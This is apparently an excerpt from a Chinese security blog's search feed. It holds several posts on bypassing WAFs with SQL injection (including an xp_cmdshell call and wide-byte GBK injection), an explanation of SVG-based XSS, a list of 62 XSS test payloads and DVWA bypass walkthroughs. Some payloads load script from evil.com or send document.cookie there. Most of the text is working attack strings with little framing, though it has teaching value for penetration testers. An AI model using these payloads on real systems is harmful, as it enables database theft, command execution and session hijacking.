?id=1;EXEC(‘ma’+&apos;ster..x’+&apos;p_cm’+&apos;dsh’+&apos;ell ”net user”’) !和()： &apos; or --+2=- -!!!&apos;2 id=1+(UnI)(oN)+(SeL)(EcT) 使用这些”特殊符号”实现绕过是一件很细微的事情，一方面各家数据库对有效符号的处理是不一样的，另一方面你得充分了解这些符号的特性和使用方法才能作为绕过手段 HTTP参数控制这里HTTP参数控制除了对查询语句的参数进行篡改，还包括HTTP方法、HTTP头的控制 HPP(HTTP Parameter Polution)（重复参数污染）/?id=1;select+1,2,3+from+users+where+id=1— /?id=1;select+1&amp;id=2,3+from+users+where+id=1— /?id=1/**/union/*&amp;id=*/select/*&amp;id=*/pwd/*&amp;id=*/from/*&amp;id=*/users HPP又称做重复参数污染，最简单的就是?uid=1&amp;uid=2&amp;uid=3，对于这种情况，不同的Web服务器处理方式。 具体WAF如何处理，要看其设置的规则，不过就示例中最后一个来看有较大可能绕过 HPF(HTTP Parameter Fragment)（HTTP分割注入）这种方法是HTTP分割注入，同CRLF有相似之处(使用控制字符%0a、%0d等执行换行) /?a=1+union/*&amp;b=*/select+1,pass/*&amp;c=*/from+users-- select * from table where a=1 union/* and b=*/select 1,pass/* limit */from users— 缓冲区溢出缓冲区溢出用于对付WAF，有不少WAF是C语言写的，而C语言自身没有缓冲区保护机制，因此如果WAF在处理测试向量时超出了其缓冲区长度，就会引发bug从而实现绕过。 ?id=1 and (select 1)=(Select 0xA*1000)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26 示例0xA*1000指0xA后面”A”重复1000次，一般来说对应用软件构成缓冲区溢出都需要较大的测试长度，这里1000只做参考，在某些情况下可能不需要这么长也能溢出。 一些整合绕过的例子：id=1/*!UnIoN*/+SeLeCT+1,2,concat(/*!table_name*/)+FrOM /*!information_schema*/.tables /*!WHERE */+/*!TaBlE_ScHeMa*/+like+database()– - ?id=-725+/*!UNION*/+/*!SELECT*/+1,GrOUp_COnCaT(COLUMN_NAME),3,4,5+FROM+/*!INFORMATION_SCHEM*/.COLUMNS+WHERE+TABLE_NAME=0x41646d696e-- index.php?page_id=-15+and+(select 1)=(Select 0xAA[..(add about 1000 &quot;A&quot;)..])+/*!uNIOn*/+/*!SeLECt*/+1,2,3,4… 单一的技术可能无法绕过过滤机制，但是多种技术的配合使用成功的可能性就会增加不少 过滤掉and和or情况下的盲注假如有这样一个注入点 index.php?uid=123 但是and和or被过滤掉了，我们可以构造一下语句 index.php?uid=strcmp(left((select+hash+from+users+limit+0,1),1),0x42)+123 123的时候页面是正确的，我们现在在盲猜hash的第一位，如果第一位等于0x42也就是B，那么strcmp结果为0，0+123=123，所以页面应该是正确的。否则就说明不是B，就这样猜，不用and和or了。 加括号/?id=1+union+(select+1,2+from+users) 如果上面一条被WAF拦截了，可以试着加一些括号。 /?id=1+union+(select+1,2+from+xxx) /?id=(1)union(select(1),mid(hash,1,32)from(users)) /?id=1+union+(select&apos;1&apos;,concat(login,hash)from+users) /?id=(1)union(((((((select(1),hex(hash)from(users)))))))) /?id=(1)or(0x50=0x50) 修复方案：1、如果可能，采用基于IP的白名单； 2、对各种不能解析的内容，全部禁止访问； 3、解析的协议，要全面； 4、对各种不符合标准模式的访问，禁止； 5、WAF解析方式，与后台的WEB服务器、web应用、数据库的解析方式尽可能一致； 6、关键字的匹配，需要考虑诸多变形情况。]]></content>
      <categories>
        <category>SQL</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[SVG XSS黑魔法]]></title>
    <url>%2F2018%2F12%2F02%2FSVG-XSS%E9%BB%91%E9%AD%94%E6%B3%95%2F</url>
    <content type="text"><![CDATA[先来看两个代码，一个可执行一个不可执行。 可执行： &lt;svg&gt;&lt;script&gt;alert&amp;#40;1)&lt;/script&gt; 不可执行： &lt;script&gt;alert&amp;#40;1)&lt;/script&gt; 那么为啥加了&lt;svg&gt;的可以执行？ 这就得由html解析流程说起了。 html解析到&lt;svg&gt;的时候会变成标签开始状态(Tag open state)，然后到标签名状态(Tag name state)，等等，最终到数据状态(Data state)，并释放当前标签的token，当解析器处于数据状态(Data state)时，它会继续解析，每当发现一个完整的标签，就会释放出一个token。 svg属于外部元素。 外部元素来源于MathML和SVG命名空间。 而MathML（数学标记语言）是一种基于XML的标准。 那么可以猜测&lt;svg&gt;遵循XML和SVG的定义。 在XML中，&amp;#40;会被解析成( 在XML中实体会自动转义,除了&lt;![CDATA[和]]&gt;包含的实体 &lt;xml&gt; &lt;name&gt;aaa&lt;/name&gt; &lt;value&gt;aaaaaaa&amp;#40;&lt;/value&gt; &lt;/xml&gt; 当然，SVG标准中也定义了script标签的存在。 所以，这个XSS之所以能够执行是因为遵循了svg及xml的标准]]></content>
      <categories>
        <category>XSS</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[XSS测试用例]]></title>
    <url>%2F2018%2F12%2F01%2FXSS%E6%B5%8B%E8%AF%95%E7%94%A8%E4%BE%8B%2F</url>
    <content type="text"><![CDATA[1.&lt;script&gt; alert(1);&lt;/script&gt; 2.&lt;script&gt;alert(&#39;xss&#39;);&lt;/script&gt; 3.&lt;script src=&quot;http://www.evil.com/cookie.php&quot;&gt;&lt;/script&gt; 4.&lt;script&gt;location.href=&quot;http://www.evil.com/cookies.php?cookie=&quot;+escape(document.cookie)&quot;&lt;/script&gt; 5.&lt;scr&lt;script&gt;ipt&gt;alert(&#39;xss&#39;);&lt;/scr&lt;/script&gt;ipt&gt; 6.&lt;img src=liu.jpg onerror=alert(/xss/)/&gt; 7.&lt;style&gt;@im\port&#39;\ja\vasc\ript:alert(\&quot;xss\&quot;)&#39;;&lt;/style&gt; 8.&lt;?echo(&#39;&lt;src)&#39;; echo(&#39;ipt&gt;alert(\&quot;xss\&quot;)&#39;;&lt;/script&gt;&#39;);?&gt; 9.&lt;marquee&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&lt;/marquee&gt; 10.&lt;IMG SRC=\&quot;jav&amp;#0x9;ascript:alert(&#39;xss&#39;);\&quot;&gt; 11.&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt; 12.&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt; 13.&lt;script src=http://www.evil.com/files.js&gt;&lt;/script&gt; 14.&lt;/title&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt; 15.&lt;/textarea&gt;&lt;script&gt;alert(/xss)&lt;/script&gt; 16.&lt;IMG LOWSRC=\&quot;javascript:alert(&#39;XSS&#39;)\&quot;&gt; 17.&lt;IMG DYNSRC=\&quot;javascript:alert(&#39;XSS&#39;)\&quot;&gt; 18.&lt;font style=&#39;color:expression(alert(document.cookie))&#39;&gt; 19.&#39;);alert(&#39;XSS 20.&lt;img src=&quot;javascript:alert(&#39;XSS&#39;)&quot;&gt; 21.[url=javascript:alert(&#39;XSS&#39;);]click me[/url] 22.&lt;body onunload=&quot;javascript:alert(&#39;XSS&#39;);&quot;&gt; 23.&lt;body onLoad=&quot;alert(&#39;XSS&#39;);&quot; 24.[color=red&#39; onmouseover=&quot;alert(&#39;XSS&#39;)&quot;]mouse over[/color] 25.&quot;/&gt;&lt;/a&gt;&lt;/&gt;&lt;img src=1.gif onerror=alert(1)&gt; 26.window.alert(&quot;XSS&quot;); 27.&lt;div style=&quot;x:expression((window==1)?&quot;:eval(&#39;r=1;alert(String.fromCharCode(83,83,83));&#39;))&quot;&gt; 28.&lt;iframe&lt;?php eval chr(11)?&gt;onload=alert(&#39;XSS&#39;)&gt;&lt;/iframe&gt; 29.&quot;&gt;&lt;script alert(String.fromCharCode(88,83,83))&lt;/script&gt;30.&#39;&gt;&gt;&lt;marquee&gt;&lt;h1&gt;XSS&lt;h1&gt;&lt;/marquee&gt; 31.&#39;&quot;&gt;&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt; 32.&#39;&quot;&gt;&gt;&lt;marquee&gt;&lt;h1&gt;XSS&lt;/h1&gt;&lt;/marquee&gt; 33.&lt;META HTTP-EQUIV=\&quot;refresh\&quot; CONTENT=\&quot;0;url=javascript:alert(&#39;XSS&#39;);\&quot;&gt; 34.&lt;META HTTP-EQUIV=\&quot;refresh\&quot;CONTENT=\&quot;0;URL=http://;url=javascript:alert(&#39;XSS&#39;);\&quot;&gt; 35.&lt;script&gt;var var=1; alert(var)&lt;/script&gt; 36.&lt;STYLE type=&quot;text/css&quot;&gt;BODY{background:url(&quot;javascript:alert(&#39;XSS&#39;)&quot;)}&lt;/STYLE&gt; 37.&lt;?=&#39;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&#39;?&gt; 38.&lt;IMG SRC=&#39;vbscript:msgbox(\&quot;XSS\&quot;)&#39;&gt; 39.&quot;onfocus=alert(document.domain)&quot;&gt;&lt;&quot; 40.&lt;FRAMESET&gt;&lt;FRAME SRC=\&quot;javascript:alert(&#39;XSS&#39;);\&quot;&gt;&lt;/FRAMESET&gt; 41.&lt;STYLE&gt;li {list-style-image:url(\&quot;javascript:alert(&#39;XSS&#39;)\&quot;);}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS 42.&lt;br size=\&quot;&amp;{alert(&#39;xss&#39;)}\&quot;&gt; 43.&lt;scrscriptipt&gt;alert(1)&lt;/scrscriptipt&gt; 44.&quot;&gt;&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert(&quot;XSS&quot;)&gt; 45.[color=red width=expression(alert(123))][color] 46.&lt;BASE HREF=&quot;javascript:alert(&#39;XSS&#39;);//&quot;&gt; 47.Execute(MsgBox(chr(88)&amp;&amp;chr(83)&amp;&amp;chr(83)))&lt; 48.&quot;&gt;&lt;/iframe&gt;&lt;script&gt;alert(123)&lt;/script&gt; 49.&lt;body onLoad=&quot;while(true) alert(&#39;XSS&#39;);&quot;&gt; 50.&quot;&lt;marquee&gt;&lt;img src=k.png onerror=alert(/xss/) /&gt; 51.&lt;div style=&quot;background:url(&#39;javascript:&#39;) 52.&lt;img src=&#39;java\nscript:alert(\&quot;XSS\&quot;)&#39;&gt; 53.&gt;&#39;&quot;&gt;&lt;img src=&quot;javascript:alert(&#39;xss&#39;)&quot;&gt; 54.&lt;svg&gt;&lt;script&gt;alert&amp;#40/1/&amp;#41&lt;/script&gt; 55.&lt;q/oncut=open()&gt; 56.&lt;q/oncut=alert(1)&gt;//在限制长度的地方很有效 57.&lt;applet code=&quot;javascript:confirm(document.cookie);&quot;&gt; // Firefox有效 58.&lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=&quot;&gt; 59.&lt;form action=&quot;Javascript:alert(1)&quot;&gt;&lt;input type=submit&gt; 60.&lt;formaction=&#39;data:text&amp;sol;html,&amp;lt;script&amp;gt;alert(1)&amp;lt/script&amp;gt&#39;&gt;&lt;button&gt;CLICK 61.&lt;iframe/src=&quot;data:text&amp;sol;html;&amp;Tab;base64&amp;NewLine;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==&quot;&gt; 62.&lt;body/onhashchange=alert(1)&gt;&lt;a href=#&gt;clickit]]></content>
      <categories>
        <category>XSS</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[XSS绕过及DVWA实例]]></title>
    <url>%2F2018%2F12%2F01%2FXSS%E7%BB%95%E8%BF%87%E5%8F%8ADVWA%E5%AE%9E%E4%BE%8B%2F</url>
    <content type="text"><![CDATA[最基本的用法：&lt;script&gt;alert(&#39;xss&#39;);&lt;/script&gt; 黑名单绕过：大多数的场所是用的黑名单来做过滤器的。 尝试插入比较正常的HTML标签，例如：&lt;b&gt;，&lt;i&gt;，&lt;u&gt;来看一下返回页面的情况是怎样的，是否被HTML编码了，或者标签被过滤了。 尝试插入不闭合的标签，例如：&lt;b，&lt;i，&lt;u，&lt;marquee然后看一下返回响应，是否对开放的标签也有过滤。 大小写及重写的绕过:&lt;SCRIscriptPT&gt;AalLEerRtT(&#39;xss&#39;);&lt;/SCscriptRIPT&gt; 事件绕过：利用JS事件进行相关绕过：&lt;img src=# onerror=alert(&#39;xss&#39;);&gt; 相关JS事件： 编码绕过： 当浏览器接受到一份HTML代码后，会对标签之间（&lt;p&gt;xxx&lt;/p&gt;等，&lt;script&gt;除外)、标签的属性中（&lt;a href=&#39;xxxx&#39;&gt;）进行实体字符解码变为相应的字符，而不会发挥出其本来该有的功能，如：&#60;被解码为&lt;后仅被当作字符，而不会被当成标签名的起始。既然是字符串，那在href=&#39;xx&#39;这些属性值本来就是字符串的地方可以作为一种可能的绕过的手段 例如：&lt;img src=1 onerror=&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&gt; 上述代码解析后为：&lt;img src=1 onerror=alert(1)&gt; ,可以弹窗 在代码被HTML解释器解释后，如果遇到需要填入url的位置，则该位置交由url解释器解释，如果是js代码的(例如onclick=””)，就js解释器解释，但是注意：javascript:不能用url编码代替，因为javascript:为协议类型，若是使用url编码，会被当作普通字符串，后面的js代码也不会被当作js代码解释 &lt;a href=&quot;javascript:%61%6c%65%72%74%28%31%29&quot;&gt;&lt;/a&gt; 被url解释器解释完后为&lt;a href=&quot;javascript:alert(1)&quot;&gt;&lt;/a&gt;，url中出现了javascript:，指明了后面的语句要当作js执行，所以再次把解释后的字符交给js解释器解释，可以弹窗。 当js解释器在标识符名称(例如函数名，属性名等等)中遇到unicode编码会进行解码，并使其标志符照常生效。而在字符串中遇到unicode编码时会进行解码只会被当作字符串。&lt;script&gt;\u0061\u006c\u0065\u0072\u0074(&#39;xss&#39;)&lt;/script&gt; 解码后为&lt;script&gt;alert(1)&lt;/script&gt;,一样可以弹窗。但如果是：&lt;script&gt;document.write(&#39;\u0039\u0041\u0059\u0097\u0108;\u0101\u0114\u0016\u0040\u0039\u0049\u0049\u0049&#39;)&lt;/script&gt; 解码后为 &lt;script&gt;document.write(&#39; &#39;);alert(&#39;111&#39;)&lt;/script&gt;就不要指望他可以弹窗了。因为解码出来的&#39;);alert(&#39;111仍为被当作字符串而不会影响上下文。 利用String.fromCharCode进行编码绕过测试代码： &lt;?php function xss_check($str){ if(preg_match(&apos;/script|alert/i&apos;, $str)) return &apos;error&apos;; else return $str; } @$id = $_GET[&apos;id&apos;]; echo xss_check($id); ?&gt; 屏蔽了alert(也可能是其他的)，此时可以使用编码绕过： &lt;img src=1 onerror=\u006a\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074:\u0061\u006c\u0065\u0072\u0074(/xss/);&gt; 将javascript和alert进行unicode编码实现绕过，成功弹窗。 利用String.fromCharCode进行编码绕过:&lt;img src=2 onerror=eval(String.fromCharCode(97,108,101,114,116,40,47,120,115,115,47,41))&gt; 其中String.fromCharCode(97,108,101,114,116,40,47,120,115,115,47,41)是alert(/xss/)编码后的内容，google插件hackbar就有此功能。 GBK宽字节绕过测试代码： &lt;!DOCTYPE html&gt; &lt;meta charset=&quot;gbk&quot;&gt; &lt;?php error_reporting(0); $conn = mysql_connect(&apos;127.0.0.1&apos;,&apos;root&apos;,&apos;root&apos;); mysql_select_db(&apos;test&apos;,$conn); #mysql_query(&quot;set names gbk&quot;); $id = addslashes($_GET[&apos;sql&apos;]); $sql = &quot;SELECT username,password FROM admin WHERE id=&apos;{$id}&apos;&quot;; echo $sql.&apos;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&apos;; if($res = mysql_query($sql)){ while($row = mysql_fetch_array($res)){ var_dump($row); } }else{ echo &quot;Error&quot;.mysql_error().&quot;&lt;/br&gt;&quot;; } ?&gt; 直接‘会被转义，不会被执行。 使用宽字符就可以被成功执行 解析过程 $_GET[‘id’]经过addslashes编码之后带入了‘’ 变成 &lt;pre&gt;2%df%5C%27 and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)%23&lt;/pre&gt; 带入mysql处理时使用了gbk字符集 %df%5c 運成功的吃掉了%5c %27‘单引号成功闭合 GBK编码，编码范围是0x8140~0xFEFE（不包括xx7F），在遇到%df(ascii(223)) &gt;ascii(128)时自动拼接%5c，因此吃掉‘，而%27、%20小于ascii(128)的字符就保留了。 0字节绕过&lt;scri%00pt&gt;alert(1);&lt;/scri%00pt&gt; &lt;scri\x00pt&gt;alert(1);&lt;/scri%00pt&gt; &lt;s%00c%00r%00%00ip%00t&gt;confirm(0);&lt;/s%00c%00r%00%00ip%00t&gt; 在IE9及以下版本成功绕过。 IE6下绕过IE下还可利用javascript:alert(/xss/); 或css body { background:black; xss:expression(alert(/zhuling.wang/));/*IE6下测试*/ } 成功绕过 DVWA测试用例反射性XSS低等级任意XSS都可用 中等级&lt;script &gt;alert(&apos;123&apos;)&lt;/script&gt; &lt;sCript&gt;alert(&apos;123&apos;)&lt;/script&gt; &lt;scri&lt;script&gt;pt&gt;alert(&apos;123&apos;)&lt;/script&gt; &lt;img src=# onerror=alert(1)&gt; &lt;h1 onclick=alert(1)&gt;123&lt;/h1&gt;等等 高等级过滤掉script标签更严格，不能使用script标签 &lt;h1 onclick=alert(1)&gt;123&lt;/h1&gt; &lt;img src=# onerror=alert(1)&gt; 其他html标签构造的事件还是可以使用的。 不可能级别用到了htmlspecialchars()，这个函数是将预定义的字符转换为 HTML 实体。预定义的字符是： &amp; （和号）成为 &amp; “ （双引号）成为 “ ‘ （单引号）成为 ‘ &lt; （小于）成为 &lt; （大于）成为 &gt; 存储型XSS低等级没有过滤直接注入，但是name框有最大长度限制，所以选择在message注入。 &lt;img src=# onerror=alert(1)&gt;等等 中等级因为一上来就给Message添加了htmlspecialchars函数所以不能进行注入，但是name框长度的最大限制是在html设置的，所以可以在审查元素中直接对长度进行修改。或者可以用burp抓包发送。 高等级message还是封死了，还是把script过滤掉了，跟中等级类似，抓包发送等等。 不可能级别这里对name和message都做了htmlspecialchars（）处理。 DOM型XSS低等级直接在网页导航栏构造GET XSS即可完成注入 中等级源码显示会过滤掉script标签，但是直接用&lt;img src=# onerror=alert(1)&gt;没有直接执行，尝试闭合option没有成功,尝试闭合select标签成功执行。 ?#default=&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;也可以。 高等级对传入值进行switch判断 ?default=English #&lt;script&gt;alert(1)&lt;/script&gt; #该字符后的数据不会发送到服务器端，从而绕过服务端过滤。]]></content>
      <categories>
        <category>XSS</category>
      </categories>
  </entry>
</search>
